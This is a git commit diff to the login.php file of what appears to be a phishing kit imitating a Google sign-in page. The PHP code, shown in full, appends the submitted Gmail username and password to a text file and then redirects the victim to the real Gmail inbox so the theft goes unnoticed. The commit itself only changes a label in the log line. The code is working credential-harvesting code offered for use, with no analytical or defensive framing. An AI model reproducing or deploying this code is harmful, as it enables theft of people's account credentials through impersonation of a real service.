d6f809c63a8f00255f315e8135b54e9766162e98
UgurCanUysal18 <67745196+UgurCanUysal18@users.noreply.github.com>
2024-05-13 19:54:51 +0300

    Update login.php

--- .sites/google_new/login.php
+++ .sites/google_new/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Old Password: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://mail.google.com/mail/u/0/#inbox');
 exit();
 ?>
